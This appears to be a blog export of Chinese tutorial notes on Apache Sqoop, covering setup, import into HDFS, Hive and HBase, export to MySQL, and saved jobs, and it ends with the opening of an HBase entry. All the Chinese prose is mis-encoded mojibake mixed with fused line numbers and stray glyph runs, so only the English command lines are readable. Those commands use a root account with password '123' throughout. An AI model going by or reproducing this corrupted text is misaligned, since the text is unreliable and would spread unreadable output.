ç›®å½•ä¸‹è¦æœ‰hive, å› ä¸ºè¦æ‹¿åˆ° hive çš„ home, æ‰§è¡Œ hive æ“ä½œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541ã€ å‡†å¤‡å®‰è£…åŒ… sqoop-1.4.6.bin_hadoop-2.0.4-alpha.tar.gz2ã€ è§£å‹å®‰è£…åŒ…åˆ°å®‰è£…ç›®å½•tar -zxvf sqoop-1.4.6.bin_hadoop-2.0.4-alpha.tar.gz -C apps/ cd appsmv sqoop-1.4.6.bin_hadoop-2.0.4-alpha/ sqoop-1.4.63ã€ è¿›å…¥åˆ° conf æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ° sqoop-env-template.shï¼Œä¿®æ”¹å…¶åç§°ä¸º sqoop-env.sh cd confmv sqoop-env-template.sh sqoop-env.sh4ã€ ä¿®æ”¹ sqoop-env.sh-----export HADOOP_COMMON_HOME=/home/ap/apps/hadoop export HADOOP_MAPRED_HOME=/home/ap/apps/hadoop export HBASE_HOME=/home/ap/apps/hbaseexport HIVE_HOME=/home/ap/apps/hiveexport ZOOCFGDIR=/home/ap/apps/zookeeper/conf-----5ã€ åŠ å…¥ mysql é©±åŠ¨åŒ…åˆ° sqoop-1.4.6/lib ç›®å½•ä¸‹cp mysql-connector-java-5.1.40-bin.jar ~/apps/sqoop-1.4.6/lib/6ã€ é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ vi ~/.bashrcç„¶åè¾“å…¥:export SQOOP_HOME=/home/hadoop/apps/sqoop-1.4.6 export PATH=$PATH:$SQOOP_HOME/binç„¶åä¿å­˜é€€å‡ºsource ~/.bashrc7ã€ éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸsqoop-version æˆ–è€… sqoopversionps : å¹å‡ºç°è­¦å‘Š, ä¸ç”¨ç®¡---[ap@cs2]~% sqoop versionWarning: /home/ap/apps/sqoop/../hcatalog does not exist! HCatalog jobs will fail.Please set $HCAT_HOME to the root of your HCatalog installation.Warning: /home/ap/apps/sqoop/../accumulo does not exist! Accumulo imports will fail.Please set $ACCUMULO_HOME to the root of your Accumulo installation.Warning: /home/ap/apps/sqoop/../zookeeper does not exist! Accumulo imports will fail.Please set $ZOOKEEPER_HOME to the root of your Zookeeper installation.18/06/28 20:43:52 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6Sqoop 1.4.6git commit id c0c5a81723759fa575844a0a1eae8f510fa32c25Compiled by root on Mon Apr 27 14:38:36 CST 20158\ ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ å¯ä»¥é…ç½®è®°ä½å¯†ç  ï£¿ï£¿ï£¿ï£¿ï£¿ä½†æ˜¯å¥½åƒä¸èµ·ä½œç”¨???æŸ¥çœ‹ä»»åŠ¡è¯¦ç»†æˆ–è€…æ‰§è¡Œä»»åŠ¡çš„æ—¶å€™ä¸è¾“å…¥å¯†ç  å…å¯†[sqoop-site.xml]æ·»åŠ : &lt;property&gt; &lt;name&gt;sqoop.metastore.client.record.password&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;description&gt;If true, allow saved passwords in the metastore.&lt;/description&gt; &lt;/property&gt; 4. åŸºæœ¬ä½¿ç”¨121) sqoop help : æŸ¥çœ‹å¸®åŠ©2) sqoop help import : è¿›ä¸€æ­¥å±‚çº§æŸ¥çœ‹ 5. Sqoop æ•°æ®å¯¼å…¥å¸¸ç”¨æŒ‡ä»¤12345678910--connect æŒ‡å®šæ•°æ®åº“é“¾æ¥url--username æŒ‡å®šæ•°æ®åº“çš„ç”¨æˆ·å--password æŒ‡å®šæ•°æ®åº“çš„å¯†ç --table æŒ‡å®šè¦å¯¼å‡ºæ•°æ®çš„mysqlæ•°æ®åº“è¡¨-m æŒ‡å®šMapTaskçš„ä¸ªæ•°--target-dir æŒ‡å®šå¯¼å‡ºæ•°æ®åœ¨HDFSä¸Šçš„å­˜å‚¨ç›®å½•--fields-terminated-by æŒ‡å®šæ¯æ¡è®°å½•ä¸­å­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦--where æŒ‡å®šæŸ¥è¯¢SQLçš„whereæ¡ä»¶--query æŒ‡å®šæŸ¥è¯¢SQL--columns æŒ‡å®šæŸ¥è¯¢åˆ— 5.1 list mysql çš„æ•°æ®åº“ &amp; è¡¨, å¤åˆ¶mysql ä¸­è¡¨ç»“æ„ç›¸åŒè¡¨ â€“&gt; hive12345678910111213141516171819202122åˆ—å‡ºMySQLæ•°æ®æœ‰å“ªäº›æ•°æ®åº“ï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop list-databases \--connect jdbc:mysql://cs2:3306/ \--username root \--password 123åˆ—å‡ºMySQLä¸­çš„æŸä¸ªæ•°æ®åº“æœ‰å“ªäº›æ•°æ®è¡¨ï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop list-tables \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123åˆ›å»ºä¸€å¼ è·Ÿmysqlä¸­çš„help_keywordè¡¨ä¸€æ ·çš„hiveè¡¨hkï¼š(æ²¡æœ‰æ•°æ®è²Œä¼¼)ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop create-hive-table \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hive-table hk 5.2 å¯¼å…¥ mysqlä¸­è¡¨ åˆ° HDFS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿å¯¼å…¥MySQLè¡¨ä¸­æ•°æ®åˆ°HDFSä¸­ï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿// æ™®é€šå¯¼å…¥ï¼šå¯¼å…¥mysqlåº“ä¸­çš„help_keywordçš„æ•°æ®åˆ°HDFSä¸Šçš„é»˜è®¤è·¯å¾„ï¼š/user/ap/help_keywordsqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \-m 1æœ€åçš„1,æ˜¯æŒ‡ä½¿ç”¨1ä¸ª mapTask å¯¼å…¥åˆ°hdfså, å¯ä»¥ä½¿ç”¨ hdfs dfs -text /.... æŸ¥çœ‹æ•°æ®----// å¯¼å…¥ï¼š æŒ‡å®šåˆ†éš”ç¬¦ &amp; å¯¼å…¥è·¯å¾„ &amp; mapTask ä¸ªæ•°ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--target-dir /user/ap/my_help_keyword1 \--fields-terminated-by '\t' \-m 3// å¯¼å…¥æ•°æ®ï¼šå¸¦whereæ¡ä»¶ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--where "name='STRING' " \--table help_keyword \--target-dir /user/ap/my_help_keyword2 \-m 1// æŸ¥è¯¢æŒ‡å®šåˆ—-------------å‘ç°ä¸€ä¸ªç»“è®º, å¦‚æœå¯åŠ¨3ä¸ª mapper, ä½†æ˜¯æœ€ååªæœ‰ä¸€ä¸ªç»“è®º, åªä¼šç”Ÿæˆä¸€ä¸ªç»“æœæ–‡ä»¶ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--columns "name" \--where "name='STRING' " \--table help_keyword \--target-dir /user/ap/my_help_keyword3 \-m 3// å¯¼å…¥ï¼šæŒ‡å®šè‡ªå®šä¹‰æŸ¥è¯¢SQL--------------ç–‘ç‚¹: split-by çš„ä½œç”¨, å’Œ -m æ•°é‡çš„å…³ç³»ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--target-dir /user/ap/my_help_keyword4 \--query 'select help_keyword_id,name from help_keyword WHERE $CONDITIONS and name = "STRING"' \--split-by help_keyword_id \--fields-terminated-by '\t' \-m 1----------------------------sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--target-dir /user/hadoop/my_help_keyword5 \--query "select help_keyword_id,name from help_keyword WHERE \$CONDITIONS" \--split-by help_keyword_id \--fields-terminated-by '\t' \-m 1# åœ¨ä»¥ä¸Šéœ€è¦æŒ‰ç…§è‡ªå®šä¹‰SQLè¯­å¥å¯¼å‡ºæ•°æ®åˆ°HDFSçš„æƒ…å†µä¸‹ï¼š1ã€å¼•å·é—®é¢˜ï¼Œè¦ä¹ˆå¤–å±‚ä½¿ç”¨å•å¼•å·ï¼Œå†…å±‚ä½¿ç”¨åŒå¼•å·ï¼Œ$CONDITIONSçš„$ç¬¦å·ä¸ç”¨è½¬ä¹‰ï¼Œ è¦ä¹ˆå¤–å±‚ä½¿ç”¨åŒå¼•å·ï¼Œé‚£ä¹ˆå†…å±‚ä½¿ç”¨å•å¼•å·ï¼Œç„¶å$CONDITIONSçš„$ç¬¦å·éœ€è¦è½¬ä¹‰2ã€è‡ªå®šä¹‰çš„SQLè¯­å¥ä¸­å¿…é¡»å¸¦æœ‰WHERE \$CONDITIONS 5.3 å¯¼å…¥MySQLæ•°æ®åº“ä¸­çš„è¡¨æ•°æ®åˆ°Hiveä¸­ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿å¯¼å…¥MySQLæ•°æ®åº“ä¸­çš„è¡¨æ•°æ®åˆ°Hiveä¸­ï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿// æ™®é€šå¯¼å…¥ï¼šæ•°æ®å­˜å‚¨åœ¨é»˜è®¤çš„default hiveåº“ä¸­ï¼Œè¡¨åå°±æ˜¯å¯¹åº”çš„mysqlçš„è¡¨åï¼š// é€šè¿‡å¯¹æ¯”å‘ç°, sqoop æ˜¯é»˜è®¤å¯¼å…¥åˆ° hdfs çš„, å¯¼å…¥åˆ°hdfsæ—¶, ä¸ç”¨åŠ é¢å¤–çš„å‚æ•°sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hive-import \-m 1hadoop fs -cat /user/myhive/warehouse/help_keyword/part-m-00000 // æŸ¥çœ‹æ•°æ®å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ hive ä¸­æŸ¥çœ‹æ•°æ®// æŒ‡å®šè¡Œåˆ†éš”ç¬¦å’Œåˆ—åˆ†éš”ç¬¦ï¼ŒæŒ‡å®šhive-importï¼ŒæŒ‡å®šè¦†ç›–å¯¼å…¥ï¼ŒæŒ‡å®šè‡ªåŠ¨åˆ›å»ºhiveè¡¨ï¼ŒæŒ‡å®šè¡¨åï¼ŒæŒ‡å®šåˆ é™¤ä¸­é—´ç»“æœæ•°æ®ç›®å½• Database does not exist: mydb_test ???æ³¨æ„: è¦å…ˆåˆ›å»º database mydb_testé—®é¢˜: ä¸ºä»€ä¹ˆå¯¼å‡ºå, å˜æˆäº†4ä¸ªå—sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--fields-terminated-by "\t" \--lines-terminated-by "\n" \--hive-import \--hive-overwrite \--create-hive-table \--delete-target-dir \--hive-database mydb_test \--hive-table new_help_keywordå¦å¤–ä¸€ç§å†™æ³•ï¼šsqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--fields-terminated-by "\t" \--lines-terminated-by "\n" \--hive-import \--hive-overwrite \--create-hive-table \--hive-table mydb_test.new_help_keyword1 \--delete-target-dir 5.4 å¢é‡å¯¼å…¥åˆ° HDFSâ€”-åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥å¯¼å…¥åˆ° Hive 12345678910111213141516171819202122232425262728ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ç¬¬ä¸‰éƒ¨åˆ†ï¼šå¢é‡å¯¼å…¥ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿Incremental import arguments: --check-column &lt;column&gt; Source column to check for incremental change åŸå§‹çš„åˆ—ä½œä¸ºå¢é•¿æ”¹å˜çš„ --incremental &lt;import-type&gt; Define an incremental import of type 'append' or 'lastmodified' --last-value &lt;value&gt; Last imported value in the incremental check columnï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿æ¯”è¾ƒä½¿ç”¨äºè‡ªå¢é•¿ä¸»é”®!! // å¢é‡å¯¼å…¥ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--target-dir /user/ap/my_help_keyword_import1 \--incremental append \--check-column help_keyword_id \--last-value 500 \-m 3 5.5 ç¬¬å››éƒ¨åˆ†ï¼š å¯¼å…¥æ•°æ®åˆ°HBase1234567891011121314ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ç¬¬å››éƒ¨åˆ†ï¼š å¯¼å…¥æ•°æ®åˆ°HBaseï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿å¯¼å…¥MySQLæ•°æ®åº“ä¸­çš„è¡¨æ•°æ®åˆ°HBaseä¸­ï¼šsqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hbase-table new_help_keyword \--column-family person \--hbase-row-key help_keyword_id 5.6 å¯¼å‡º12345678910111213141516171819202122232425262728293031323334353637ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ç¬¬äº”éƒ¨åˆ†ï¼šå¯¼å‡ºï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿æ³¨æ„ï¼šå¯¼å‡ºçš„RDBMSçš„è¡¨å¿…é¡»è‡ªå·±é¢„å…ˆåˆ›å»ºï¼Œä¸ä¼šè‡ªåŠ¨åˆ›å»º------mysql-----å…ˆåœ¨ mysql ä¸­åˆ›å»ºåº“create database sqoopdb default character set utf8 COLLATE utf8_general_ci; use sqoopdb;CREATE TABLE sqoopstudent ( id INT NOT NULL PRIMARY KEY, name VARCHAR(20), sex VARCHAR(20), age INT,department VARCHAR(20));// å¯¼å‡ºHDFSæ•°æ®åˆ°MySQLï¼šï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿sqoop export \--connect jdbc:mysql://cs2:3306/sqoopdb \--username root \--password 123 \--table sqoopstudent \--export-dir /sqoopdata \--fields-terminated-by ','// å¯¼å‡ºhiveæ•°æ®åˆ°MySQLï¼šsqoop export \--connect jdbc:mysql://cs2:3306/sqoopdb \--username root \--password 123 \--table uv_info \--export-dir /user/hive/warehouse/uv/dt=2011-08-03 \--input-fields-terminated-by '\t' 5.6 å¯¼å‡ºHBaseæ•°æ®åˆ°MySQLå¾ˆé—æ†¾ï¼Œç°åœ¨è¿˜æ²¡æœ‰ç›´æ¥çš„å‘½ä»¤å°† HBase çš„æ•°æ®å¯¼å‡ºåˆ° MySQL ä¸€èˆ¬é‡‡ç”¨å¦‚ä¸‹ 3 ç§æ–¹æ³•: 1ã€å°† HBase æ•°æ®ï¼Œæ‰å¹³åŒ–æˆ HDFS æ–‡ä»¶ï¼Œç„¶åå†ç”± sqoop å¯¼å…¥ 2ã€å°† HBase æ•°æ®å¯¼å…¥ Hive è¡¨ä¸­ï¼Œç„¶åå†å¯¼å…¥ MySQL 3ã€ç›´æ¥ä½¿ç”¨ HBase çš„ Java API è¯»å–è¡¨æ•°æ®ï¼Œç›´æ¥å‘ MySQL å¯¼å…¥ï¼Œä¸éœ€è¦ä½¿ç”¨ sqoop 5.7 sqoop æ”¯æŒ &amp; ä¸æ”¯æŒhdfs to mysql å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ï¼ï¼hive to mysql å°±æ˜¯hdfs to mysqlhbase to mysql å¾ˆä¸å¹¸ï¼Œä¸æ”¯æŒã€‚ï¼ æ€ä¹ˆå®ç°ï¼Ÿ 1ã€æ‰å¹³åŒ–åˆ°HDFS 2ã€hbaseå’Œhiveåšæ•´åˆ 3ã€è‡ªå·±ç¼–å†™ç¨‹åºå»å®ç°ä»HBASEå½“ä¸­è¯»å–æ•°æ®ï¼Œç„¶åå†™å…¥åˆ°mYsql 6.Sqoop Job ä½œä¸šæŸ¥çœ‹å¸®åŠ©: sqoop help job 6.0 mysql åˆ›å»ºæ•°æ®åº“ spider å’Œ è¡¨ lagou12# è¿™æ ·å¯ä»¥ç›´æ¥å¯¼å…¥ sql æ•°æ®source /home/ap/temp/lagou.sql 6.1 åˆ›å»ºä½œä¸š Job (â€“create)123456789# æ³¨æ„: mysql ä¸­æ­¤æ—¶å·²ç»å­˜åœ¨ spider åº“, åº“ä¸­æœ‰ lagou è¡¨# ps: å¯¼å…¥è¡¨sqoop job --create my_sqoop_job \-- import \--connect jdbc:mysql://cs2:3306/spider \--username root \--password 123 \--table lagou 6.2 æŸ¥çœ‹ä½œä¸š Job (â€“list)1234sqoop job --list----------------------Available jobs: my_sqoop_job 6.3 æŸ¥çœ‹ä½œä¸šè¯¦ç»†ä¿¡æ¯ (â€“show)1sqoop job --show my_sqoop_job 6.4 æ‰§è¡Œä½œä¸š1sqoop job --exec my_sqoop_job 6.5 åˆ é™¤ä½œä¸š1sqoop job --delete my_sqoop_job 7.Sqoop å¯¼å…¥å¯¼å‡ºåŸç†7.1 å¯¼å…¥åŸç† 1ã€ç¬¬ä¸€æ­¥ï¼ŒSqoop ä¼šé€šè¿‡ JDBC æ¥è·å–æ‰€éœ€è¦çš„æ•°æ®åº“å…ƒæ•°æ®ï¼Œä¾‹å¦‚ï¼Œå¯¼å…¥è¡¨çš„åˆ—åï¼Œæ•°æ® ç±»å‹ç­‰ã€‚ 2ã€ç¬¬äºŒæ­¥ï¼Œè¿™äº›æ•°æ®åº“çš„æ•°æ®ç±»å‹(varchar, number ç­‰)ä¼šè¢«æ˜ å°„æˆ Java çš„æ•°æ®ç±»å‹(String, int ç­‰)ï¼Œæ ¹æ®è¿™äº›ä¿¡æ¯ï¼ŒSqoop ä¼šç”Ÿæˆä¸€ä¸ªä¸è¡¨ååŒåçš„ç±»ç”¨æ¥å®Œæˆåºåˆ—åŒ–å·¥ä½œï¼Œä¿å­˜è¡¨ä¸­çš„ æ¯ä¸€è¡Œè®°å½•ã€‚ 3ã€ç¬¬ä¸‰æ­¥ï¼ŒSqoop å¯åŠ¨ MapReducer ä½œä¸š 4ã€ç¬¬å››æ­¥ï¼Œå¯åŠ¨çš„ä½œä¸šåœ¨ input çš„è¿‡ç¨‹ä¸­ï¼Œä¼šé€šè¿‡ JDBC è¯»å–æ•°æ®è¡¨ä¸­çš„å†…å®¹ï¼Œè¿™æ—¶ï¼Œä¼šä½¿ ç”¨ Sqoop ç”Ÿæˆçš„ç±»è¿›è¡Œååºåˆ—åŒ–æ“ä½œ 5ã€ç¬¬äº”æ­¥ï¼Œæœ€åå°†è¿™äº›è®°å½•å†™åˆ° HDFS ä¸­ï¼Œåœ¨å†™å…¥åˆ° HDFS çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ ·ä¼šä½¿ç”¨ Sqoop ç”Ÿ æˆçš„ç±»è¿›è¡Œååºåˆ—åŒ– 7.2 å¯¼å‡ºåŸç† 1ã€ ç¬¬ä¸€æ­¥ï¼Œsqoop ä¾ç„¶ä¼šé€šè¿‡ JDBC è®¿é—®å…³ç³»å‹æ•°æ®åº“ï¼Œå¾—åˆ°éœ€è¦å¯¼å‡ºæ•°æ®çš„å…ƒæ•°æ®ä¿¡æ¯ 2ã€ ç¬¬äºŒæ­¥ï¼Œæ ¹æ®è·å–åˆ°çš„å…ƒæ•°æ®çš„ä¿¡æ¯ï¼Œsqoop ç”Ÿæˆä¸€ä¸ª Java ç±»ï¼Œç”¨æ¥è¿›è¡Œæ•°æ®çš„ä¼ è¾“è½½ ä½“ã€‚è¯¥ç±»å¿…é¡»å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ– 3ã€ ç¬¬ä¸‰æ­¥ï¼Œå¯åŠ¨ mapreduce ä½œä¸š 4ã€ ç¬¬å››æ­¥ï¼Œsqoop åˆ©ç”¨ç”Ÿæˆçš„è¿™ä¸ª java ç±»ï¼Œå¹¶è¡Œçš„ä» hdfs ä¸­è¯»å–æ•°æ® 5ã€ ç¬¬äº”æ­¥ï¼Œæ¯ä¸ª map ä½œä¸šéƒ½ä¼šæ ¹æ®è¯»å–åˆ°çš„å¯¼å‡ºè¡¨çš„å…ƒæ•°æ®ä¿¡æ¯å’Œè¯»å–åˆ°çš„æ•°æ®ï¼Œç”Ÿæˆä¸€ æ‰¹ insert è¯­å¥ï¼Œç„¶åå¤šä¸ª map ä½œä¸šä¼šå¹¶è¡Œçš„å‘æ•°æ®åº“ mysql ä¸­æ’å…¥æ•°æ® æ‰€ä»¥ï¼Œæ•°æ®æ˜¯ä» hdfs ä¸­å¹¶è¡Œçš„è¿›è¡Œè¯»å–ï¼Œä¹Ÿæ˜¯å¹¶è¡Œçš„è¿›å…¥å†™å…¥ï¼Œé‚£å¹¶è¡Œçš„è¯»å–æ˜¯ä¾èµ– hdfs çš„æ€§èƒ½ï¼Œè€Œå¹¶è¡Œçš„å†™å…¥åˆ° mysql ä¸­ï¼Œé‚£å°±è¦ä¾èµ–äº mysql çš„å†™å…¥æ€§èƒ½å˜ã€‚ å®˜ç½‘: å‚è€ƒPDF:]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Sqoop</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Sqoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-HBase-1]]></title>
    <url>%2F2018%2F06%2F26%2FHadoop%2F5-HBase%2Fi-HBase-1%2F</url>
    <content type="text"><![CDATA[Hbaseæ¦‚å¿µ hbase &amp; hdfs å…³ç³»å›¾ hadoopæ•°æ®åº“ï¼Œåˆ†å¸ƒå¼å¯ä¼¸ç¼©å¤§å‹æ•°æ®å­˜å‚¨ã€‚ ç”¨æˆ·å¯¹éšæœºã€å®æ—¶è¯»å†™æ•°æ®ã€‚ åäº¿è¡Œ x ç™¾ä¸‡åˆ—ã€‚ ç‰ˆæœ¬åŒ–ã€éå…³ç³»å‹æ•°æ®åº“ã€‚ Feature Linear and modular scalability. //çº¿æ€§æ¨¡å—åŒ–æ‰©å±•æ–¹å¼ã€‚ Strictly consistent reads and writes. //ä¸¥æ ¼ä¸€è‡´æ€§è¯»å†™ Automatic and configurable sharding of tables//è‡ªåŠ¨å¯é…ç½®è¡¨åˆ‡å‰² Automatic failover support between RegionServers.//åŒºåŸŸæœåŠ¡å™¨ä¹‹é—´è‡ªåŠ¨å®¹åœ¨ Convenient base classes for backing Hadoop MapReduce jobs with Apache HBase tables. Easy to use Java API for client access.//java API Block cache and Bloom Filters for real-time 